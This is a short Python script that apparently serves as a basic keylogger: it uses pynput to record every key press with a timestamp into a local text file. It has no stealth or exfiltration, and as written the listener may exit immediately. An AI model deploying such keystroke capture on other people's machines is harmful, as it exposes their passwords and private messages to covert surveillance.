from pynput import keyboard
from datetime import datetime



def key_press(rem):
	# print(key)
	with open('yo.txt','a') as file:
		file.write(str(rem)+' --> '+str(datetime.now())+'\n')
# print(datetime.now())



l = keyboard.Listener(on_press = key_press)
l.start()
# import time
# print(time.time())